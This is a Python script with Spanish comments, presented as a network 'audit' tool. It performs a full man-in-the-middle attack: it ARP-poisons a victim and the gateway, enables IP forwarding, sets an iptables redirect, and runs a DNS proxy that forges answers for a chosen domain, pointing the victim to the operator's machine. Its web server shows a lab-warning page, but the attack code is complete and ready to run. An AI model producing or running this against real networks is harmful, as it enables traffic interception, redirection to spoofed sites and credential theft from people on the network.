#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import threading
import time
import os
import sys
import http.server
import socketserver
from scapy.all import *

def banner():
    print("==================================================")
    print("    HERRAMIENTA DE AUDITORÍA: ARP + DNS + WEB    ")
    print("==================================================")

def setup_iptables():
    print("[*] Configurando reglas de iptables para redirección DNS...")
    # Redirige todo el tráfico UDP del puerto 53 al puerto 53 local
    os.system("iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 53")

def cleanup_iptables():
    print("\n[*] Limpiando reglas de iptables...")
    # Limpia la tabla nat para dejar el sistema de red intacto
    os.system("iptables -t nat -F")

def main():
    # Comprobar permisos de root (obligatorio para iptables, scapy y puerto 53)
    if os.geteuid() != 0:
        print("[-] Error: Este script debe ejecutarse con privilegios de administrador (sudo).")
        sys.exit(1)

    banner()

    # Configuración interactiva
    TARGET_IP = input("[?] Introduce la IP de la víctima (ej. 192.168.1.50): ").strip()
    GATEWAY_IP = input("[?] Introduce la IP del Router/Gateway (ej. 192.168.1.1): ").strip()
    TARGET_DOMAIN = input("[?] Introduce el dominio a interceptar (ej. nike.com): ").strip()
    FAKE_IP = input("[?] Introduce tu IP local (destino de redirección): ").strip()

    if not TARGET_DOMAIN.endswith('.'):
        TARGET_DOMAIN += '.'
    
    DOMAIN_BYTES = TARGET_DOMAIN.encode()
    UPSTREAM_DNS = ("8.8.8.8", 53)

    # 1. Obtener la dirección MAC de un objetivo mediante su IP
    def get_mac(ip):
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)
        for _, received in ans:
            return received.hwsrc
        return None

    print("\n[*] Resolviendo direcciones MAC en la red local...")
    target_mac = get_mac(TARGET_IP)
    gateway_mac = get_mac(GATEWAY_IP)

    if not target_mac:
        print("[-] Error: No se pudo encontrar la MAC de la víctima. Verifica la IP.")
        sys.exit(1)

    if not gateway_mac:
        print("[-] Error: No se pudo encontrar la MAC del router. Verifica la IP.")
        sys.exit(1)

    print(f"[+] Víctima MAC encontrada: {target_mac}")
    print(f"[+] Router MAC encontrado: {gateway_mac}")

    # 2. Función de Envenenamiento ARP (Hilo 1)
    def spoof_loop(target_ip, target_mac, gateway_ip, gateway_mac):
        packet_target = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        packet_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
        
        while True:
            sendp(packet_target, verbose=0)
            sendp(packet_gateway, verbose=0)
            time.sleep(2)

    # 3. Servidor Web Educativo de Laboratorio (Hilo 2)
    def start_web_server():
        PORT = 80
        class LabHandler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-type", "text/html; charset=utf-8")
                self.end_headers()
                html_content = """
                <html>
                    <head><title>Laboratorio de Ciberseguridad</title></head>
                    <body style="font-family: Arial; text-align: center; margin-top: 50px;">
                        <h1 style="color: #d9534f;">⚠️ Alerta de Laboratorio de Red</h1>
                        <p>Esta página es una simulación controlada con fines educativos de auditoría DNS.</p>
                        <p>El tráfico ha sido redirigido con éxito en un entorno aislado.</p>
                    </body>
                </html>
                """
                self.wfile.write(html_content.encode("utf-8"))
            
            def log_message(self, format, *args):
                return

        try:
            with socketserver.TCPServer(("0.0.0.0", PORT), LabHandler) as httpd:
                print(f"[*] Servidor Web de laboratorio activo en el puerto {PORT}")
                httpd.serve_forever()
        except Exception as e:
            print(f"[-] No se pudo iniciar el servidor web en el puerto 80: {e}")

    # Habilitar IP Forwarding
    if os.path.exists("/proc/sys/net/ipv4/ip_forward"):
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    # Aplicar regla de iptables automáticamente
    setup_iptables()

    # Iniciar hilos en segundo plano
    print("[*] Iniciando hilo de ARP Spoofing...")
    spoof_thread = threading.Thread(target=spoof_loop, args=(TARGET_IP, target_mac, GATEWAY_IP, gateway_mac))
    spoof_thread.daemon = True
    spoof_thread.start()

    print("[*] Iniciando hilo de Servidor Web (Puerto 80)...")
    web_thread = threading.Thread(target=start_web_server)
    web_thread.daemon = True
    web_thread.start()

    # 4. Servidor DNS Proxy (Socket UDP en el puerto 53 en el hilo principal)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", 53))

    print(f"\n[*] Servidor DNS Proxy activo en el puerto 53.")
    print(f"[*] Interceptando dominio: {TARGET_DOMAIN} -> Apuntando a: {FAKE_IP}")
    print("[*] Estado: Atacando. Presiona Ctrl+C para detener y salir.\n")

    try:
        while True:
            data, addr = sock.recvfrom(512)
            dns_pkt = DNS(data)
            
            if dns_pkt.haslayer(DNSQR):
                qname = dns_pkt[DNSQR].qname
                print(f"[+] Petición DNS de {addr[0]} para: {qname.decode()}")
                
                if DOMAIN_BYTES in qname:
                    print(f"[!] ¡Dominio interceptado! Redirigiendo {qname.decode()} hacia {FAKE_IP}")
                    
                    spoofed_resp = DNS(
                        id=dns_pkt.id,
                        qr=1,           
                        aa=1,           
                        rd=dns_pkt.rd,  
                        qd=dns_pkt.qd,  
                        an=DNSRR(rrname=qname, ttl=10, rdata=FAKE_IP)
                    )
                    
                    sock.sendto(bytes(spoofed_resp), addr)
                    print("[✓] Respuesta DNS falsificada enviada con éxito.\n")
                
                else:
                    proxy_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    proxy_sock.sendto(data, UPSTREAM_DNS)
                    response_data, _ = proxy_sock.recvfrom(512)
                    proxy_sock.close()
                    
                    sock.sendto(response_data, addr)

    except KeyboardInterrupt:
        print("\n\n[!] Deteniendo ataque por interrupción del usuario...")
        cleanup_iptables()
        print("[*] Limpieza completada. Saliendo. ¡Hasta luego!")
        sys.exit(0)

if __name__ == "__main__":
    main()
